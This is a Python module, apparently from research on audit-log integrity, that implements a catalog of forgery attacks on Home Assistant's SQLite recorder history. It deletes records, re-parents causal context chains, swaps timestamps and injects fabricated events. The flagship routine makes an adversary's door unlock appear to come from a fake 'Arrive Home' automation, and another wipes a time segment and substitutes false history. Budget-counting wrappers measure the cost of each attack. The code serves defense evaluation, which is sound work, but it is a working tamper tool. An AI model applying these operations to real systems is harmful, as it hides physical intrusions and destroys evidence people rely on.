"""FT-1 .. FT-12 — the predeclared forgery catalog, as executable operations.

Every forgery reports the ROWS IT WROTE, because b (database write count) is the
HEADLINE BUDGET: it is the resource the defense actually rations, and anchoring
frequency f is its dual. Matched-budget comparison is what stops "the composed
attack won" collapsing into "the composed attack spent more".

Renderer-level invariants a working forgery MUST satisfy (all three MEASURED in
M1; none is visible from the schema):
  (i)   a fabricated cause must PRECEDE its effect in wall-clock order, because
        HA's logbook builds its context lookup from rows streaming in time order;
  (ii)  old_state_id must be chained or an injected row is invisible;
  (iii) the automation's own entity state row must be injected, or the actuation
        ends up UNATTRIBUTED (SEV-1) rather than MISATTRIBUTED (SEV-2).
"""
from __future__ import annotations
import json, os, sqlite3


class _CountingConnection:
    """A sqlite3 connection that accounts for what the adversary actually spent.

    E8 (mock review) makes the point that ``a database write`` is ambiguous: one
    SQL statement can modify many rows, and neither number tells you how much was
    written to disk. A budget stated in one unit therefore bounds a different
    thing than a budget stated in another, and a composed forgery can be cheap in
    one while expensive in another. So all three are counted here rather than
    reconstructed afterwards, because rowcount is only available at the moment of
    execution and bytes are only visible as a delta across the whole operation.
    """

    __slots__ = ("_c", "_owner")

    def __init__(self, con, owner):
        self._c = con
        self._owner = owner

    def execute(self, sql, args=()):
        cur = self._c.execute(sql, args)
        o = self._owner
        o.sql_statements += 1
        # rowcount is -1 for SELECT and for statements sqlite cannot count;
        # treating that as zero is correct, since a read spends no row budget.
        if cur.rowcount and cur.rowcount > 0:
            o.rows_touched += cur.rowcount
        return cur

    def executemany(self, sql, seq):
        seq = list(seq)
        cur = self._c.executemany(sql, seq)
        o = self._owner
        o.sql_statements += 1
        o.rows_touched += len(seq)
        return cur

    def cursor(self):
        # Several forgeries take a cursor and execute through it. Without
        # wrapping it, those statements and the rows they touch are invisible to
        # the budget, which silently under-reports exactly the injection classes.
        return _CountingCursor(self._c.cursor(), self._owner)

    def commit(self):
        """Sample the write-ahead log at commit, which is the only moment it is
        observable. SQLite grows the WAL when a transaction commits and truncates
        it when the writing connection closes, so a size read after close reports
        zero for every forgery regardless of what it wrote. Sampling here and
        accumulating the peak gives the bytes the adversary actually pushed
        through the log."""
        self._c.commit()
        import os as _os
        try:
            n = _os.path.getsize(self._owner.db + "-wal")
        except OSError:
            n = 0
        o = self._owner
        if n > o._wal_peak:
            o.wal_bytes += n - o._wal_peak
            o._wal_peak = n
        else:
            # The log was checkpointed between commits; everything written since
            # the last sample is gone from the file but was still written.
            o.wal_bytes += n
            o._wal_peak = n

    def __getattr__(self, k):
        return getattr(self._c, k)


class _CountingCursor:
    __slots__ = ("_cur", "_owner")

    def __init__(self, cur, owner):
        self._cur = cur
        self._owner = owner

    def execute(self, sql, args=()):
        self._cur.execute(sql, args)
        o = self._owner
        o.sql_statements += 1
        if self._cur.rowcount and self._cur.rowcount > 0:
            o.rows_touched += self._cur.rowcount
        return self._cur

    def executemany(self, sql, seq):
        seq = list(seq)
        self._cur.executemany(sql, seq)
        self._owner.sql_statements += 1
        self._owner.rows_touched += len(seq)
        return self._cur

    def __getattr__(self, k):
        return getattr(self._cur, k)


class Forger:
    def __init__(self, db: str):
        self.db = db
        self.writes = 0
        self.log = []
        # E8 budget accounting.
        self.rows_touched = 0
        self.sql_statements = 0
        self.wal_bytes = 0
        self._wal_peak = 0
        # WAL is switched on before the baseline is taken, deliberately. In the
        # default rollback-journal mode a DELETE leaves the main file the same
        # size and truncates the journal at commit, so the byte delta reads as
        # zero and a wholesale purge would be reported as costing nothing. In WAL
        # mode every modified page is appended to the log, which is the quantity
        # the budget is supposed to bound. The recorder runs in WAL mode anyway,
        # so this matches the deployment rather than distorting it.
        # A connection is PINNED open for the Forger's lifetime. Closing the last
        # connection to a WAL database checkpoints the log and deletes it, so
        # every per-operation connection would erase the evidence of its own cost
        # on the way out and the byte budget would read zero. Holding one
        # connection open keeps the WAL on disk to be measured. Autocheckpoint is
        # also disabled, so a long forgery is not silently folded back into the
        # main file partway through.
        self._pin = None
        self.wal = False
        try:
            # isolation_level=None matters: Python's sqlite3 opens an implicit
            # transaction before statements, and PRAGMA journal_mode cannot run
            # inside one -- it fails silently and leaves the database in rollback
            # mode, which is how the first version of this accounting reported
            # every attack as costing zero bytes. The pragma's return value is
            # checked rather than assumed for the same reason.
            self._pin = sqlite3.connect(self.db, timeout=30, isolation_level=None)
            mode = self._pin.execute("PRAGMA journal_mode=WAL").fetchone()
            self.wal = bool(mode) and str(mode[0]).lower() == "wal"
            self._pin.execute("PRAGMA wal_autocheckpoint=0")
        except Exception:                                     # noqa: BLE001
            self._pin = None
        self._bytes_before = self._db_bytes()

    def close(self):
        if getattr(self, "_pin", None) is not None:
            try:
                self._pin.close()
            except Exception:                                 # noqa: BLE001
                pass
            self._pin = None

    def _db_bytes(self) -> int:
        """Bytes across the database and its write-ahead log.

        The WAL has to be included. A forgery that only rewrites existing rows
        may leave the main file's size unchanged while writing every one of those
        pages to the WAL, so measuring the database file alone would report a
        substantial attack as free.
        """
        import os as _os
        n = 0
        for suf in ("", "-wal", "-shm"):
            try:
                n += _os.path.getsize(self.db + suf)
            except OSError:
                pass
        return n

    def budget(self) -> dict:
        """The three budget models E8 requires, as spent so far."""
        return {"rows": self.rows_touched,
                "sql_statements": self.sql_statements,
                "bytes": self.wal_bytes,
                "wal": self.wal}

    def _con(self):
        return _CountingConnection(sqlite3.connect(self.db, timeout=30), self)

    def _mid(self, con, entity):
        r = con.execute("SELECT metadata_id FROM states_meta WHERE entity_id=?",
                        (entity,)).fetchone()
        return r[0] if r else None

    def _note(self, ft, n, **kw):
        self.writes += n
        self.log.append(dict(ft=ft, rows=n, **kw))

    # ------------------------------------------------------------- F_del
    def ft1_delete_own_action(self, adv_ctx: bytes):
        con = self._con()
        n = con.execute("DELETE FROM events WHERE context_id_bin=?", (adv_ctx,)).rowcount
        con.commit(); con.close()
        self._note("FT-1", n, ctx=adv_ctx.hex()); return n

    def ft2_delete_intermediate(self, ctx: bytes = None):
        """Delete an intermediate trigger/condition node, orphaning its subtree.
        Targets a REAL automation_triggered node: the adversary's own context has
        none, so scoping the delete to it was a silent no-op (0 writes)."""
        con = self._con()
        row = con.execute("""SELECT e.event_id FROM events e
                               JOIN event_types et ON et.event_type_id=e.event_type_id
                              WHERE et.event_type='automation_triggered'
                              ORDER BY e.time_fired_ts DESC LIMIT 1""").fetchone()
        n = 0
        if row:
            n = con.execute("DELETE FROM events WHERE event_id=?", (row[0],)).rowcount
        con.commit(); con.close()
        self._note("FT-2", n, targeted="latest automation_triggered"); return n

    def ft3_delete_segment(self, lo: float, hi: float):
        con = self._con()
        n = con.execute("DELETE FROM states WHERE last_updated_ts>=? AND last_updated_ts<?",
                        (lo, hi)).rowcount
        n += con.execute("DELETE FROM events WHERE time_fired_ts>=? AND time_fired_ts<?",
                         (lo, hi)).rowcount
        con.commit(); con.close()
        self._note("FT-3", n, window=[lo, hi]); return n

    # ------------------------------------------------------------- F_rep
    def ft4_reparent(self, adv_ctx: bytes, new_parent: bytes, entity: str,
                     new_ctx: bytes | None = None):
        """PURE edge re-parent. Writes ONLY context columns; state_id, state
        value and every timestamp are left byte-identical. MEASURED: B2 is
        mechanically blind to this."""
        con = self._con(); cur = con.cursor()
        before = cur.execute(
            """SELECT state_id,state,last_updated_ts FROM states
                WHERE context_id_bin=? AND metadata_id=
                (SELECT metadata_id FROM states_meta WHERE entity_id=?)""",
            (adv_ctx, entity)).fetchall()
        if new_ctx:
            cur.execute("""UPDATE states SET context_id_bin=?, context_parent_id_bin=?
                            WHERE context_id_bin=? AND metadata_id=
                            (SELECT metadata_id FROM states_meta WHERE entity_id=?)""",
                        (new_ctx, new_parent, adv_ctx, entity))
        else:
            cur.execute("""UPDATE states SET context_parent_id_bin=?
                            WHERE context_id_bin=? AND metadata_id=
                            (SELECT metadata_id FROM states_meta WHERE entity_id=?)""",
                        (new_parent, adv_ctx, entity))
        n = cur.rowcount; con.commit()
        after = cur.execute(
            """SELECT state_id,state,last_updated_ts FROM states
                WHERE context_id_bin=? AND metadata_id=
                (SELECT metadata_id FROM states_meta WHERE entity_id=?)""",
            (new_ctx or adv_ctx, entity)).fetchall()
        con.close()
        identical = sorted(before) == sorted(after)
        self._note("FT-4", n, content_byte_identical=identical)
        return {"rows": n, "content_byte_identical": identical}

    def ft5_reparent_branch(self, ctx: bytes, new_parent: bytes):
        con = self._con()
        n = con.execute("UPDATE events SET context_parent_id_bin=? WHERE context_id_bin=?",
                        (new_parent, ctx)).rowcount
        con.commit(); con.close(); self._note("FT-5", n); return n

    def ft6_swap_siblings(self, k1: int, k2: int):
        con = self._con(); cur = con.cursor()
        a = cur.execute("SELECT last_updated_ts FROM states WHERE state_id=?", (k1,)).fetchone()
        b = cur.execute("SELECT last_updated_ts FROM states WHERE state_id=?", (k2,)).fetchone()
        if not (a and b):
            con.close(); return 0
        cur.execute("UPDATE states SET last_updated_ts=? WHERE state_id=?", (b[0], k1))
        cur.execute("UPDATE states SET last_updated_ts=? WHERE state_id=?", (a[0], k2))
        con.commit(); con.close(); self._note("FT-6", 2); return 2

    # ------------------------------------------------------------- F_inj
    def inject_state(self, entity: str, value: str, ctx: bytes,
                     par: bytes | None, ts: float, ft="FT-7"):
        con = self._con(); cur = con.cursor()
        m = self._mid(con, entity)
        if m is None:
            con.close(); return None
        # (ii) chain old_state_id or the logbook will not render it as a change
        prev = cur.execute("""SELECT state_id FROM states WHERE metadata_id=?
                               AND last_updated_ts < ? ORDER BY last_updated_ts DESC LIMIT 1""",
                           (m, ts)).fetchone()
        cur.execute("""INSERT INTO states (metadata_id,state,last_updated_ts,last_changed_ts,
                         last_reported_ts,context_id_bin,context_parent_id_bin,origin_idx,
                         old_state_id) VALUES (?,?,?,?,?,?,?,0,?)""",
                    (m, value, ts, ts, ts, ctx, par, prev[0] if prev else None))
        sid = cur.lastrowid; con.commit(); con.close()
        self._note(ft, 1, entity=entity, state=value); return sid

    def inject_event(self, etype: str, data: dict, ctx: bytes,
                     par: bytes | None, ts: float, ft="FT-7"):
        con = self._con(); cur = con.cursor()
        r = cur.execute("SELECT event_type_id FROM event_types WHERE event_type=?",
                        (etype,)).fetchone()
        if r:
            etid = r[0]
        else:
            cur.execute("INSERT INTO event_types (event_type) VALUES (?)", (etype,))
            etid = cur.lastrowid
        shared = json.dumps(data, sort_keys=True)
        cur.execute("INSERT INTO event_data (hash,shared_data) VALUES (?,?)",
                    (abs(hash(shared)) % (2**31), shared))
        cur.execute("""INSERT INTO events (event_type_id,data_id,origin_idx,time_fired_ts,
                         context_id_bin,context_parent_id_bin) VALUES (?,?,0,?,?,?)""",
                    (etid, cur.lastrowid, ts, ctx, par))
        eid = cur.lastrowid; con.commit(); con.close()
        self._note(ft, 1, etype=etype); return eid

    # ---------------------------------------------------------- composed
    def ft10_causal_laundering(self, adv_ctx: bytes, entity: str,
                               automation: str, trigger_entity: str, base_ts: float):
        """FLAGSHIP. MEASURED b = 7 row-writes. Verified at L0 against HA's own
        logbook renderer; CE_b = 1 at matched budget by exact enumeration."""
        A, T = os.urandom(16), os.urandom(16)
        # (i) fabricated causes must PRECEDE the effect
        self.inject_state(trigger_entity, "on", T, None, base_ts - 2.0, "FT-10")
        self.inject_event("automation_triggered",
                          {"entity_id": automation, "name": "Arrive Home",
                           "source": "state of %s" % trigger_entity},
                          A, T, base_ts - 1.5, "FT-10")
        self.inject_event("call_service",
                          {"domain": entity.split(".")[0], "service": "unlock"},
                          A, T, base_ts - 1.4, "FT-10")
        # (iii) the automation's OWN entity state row, or it is SEV-1 not SEV-2
        self.inject_state(automation, "on", A, T, base_ts - 1.3, "FT-10")
        rep = self.ft4_reparent(adv_ctx, T, entity, new_ctx=A)
        dele = self.ft1_delete_own_action(adv_ctx)
        return {"budget_b": self.writes, "reparent": rep, "deleted": dele,
                "fake_automation_ctx": A.hex(), "fake_trigger_ctx": T.hex()}

    def ft11_branch_laundering(self, ctx: bytes, new_parent: bytes):
        self.ft2_delete_intermediate(ctx)
        self.ft5_reparent_branch(ctx, new_parent)
        return {"budget_b": self.writes}

    def ft12_segment_substitution(self, lo: float, hi: float, entity: str,
                                  automation: str, trigger_entity: str):
        self.ft3_delete_segment(lo, hi)
        A, T = os.urandom(16), os.urandom(16)
        self.inject_state(trigger_entity, "on", T, None, lo + 0.1, "FT-12")
        self.inject_event("automation_triggered",
                          {"entity_id": automation, "name": "Evening Routine"},
                          A, T, lo + 0.2, "FT-12")
        self.inject_state(entity, "unlocked", A, T, lo + 0.3, "FT-12")
        return {"budget_b": self.writes}
